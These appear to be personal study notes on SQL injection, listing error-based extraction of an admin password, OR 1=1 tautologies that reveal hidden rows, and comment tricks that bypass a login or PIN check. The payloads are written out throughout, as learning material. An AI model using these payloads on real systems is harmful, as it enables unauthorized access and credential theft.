
triggers error in the database to collect info:

1. `CONVERT((SELECT Password FROM Users WHERE Username="admin"), DATE);`

2. getting hidden data:

  * sql comments: `--` => `''+OR+1=1--` [[sqli examples#sqli in WHERE clause| in WHERE clause to get hidden data]].

3. changing application logic:

  * mysql payload: `uname=' or 1=1;` or perhaps `#` to [[sqli examples#allowing login bypass | login bypass]].

4. in the password field:

`SELECT rowid, * FROM users WHERE username = 'admin' AND pin = 0 OR 1=1`

you could still inject into username but in later parts of the program it would be used.
The OR 1=1 condition always returns true, so it bypasses the pin check entirely.
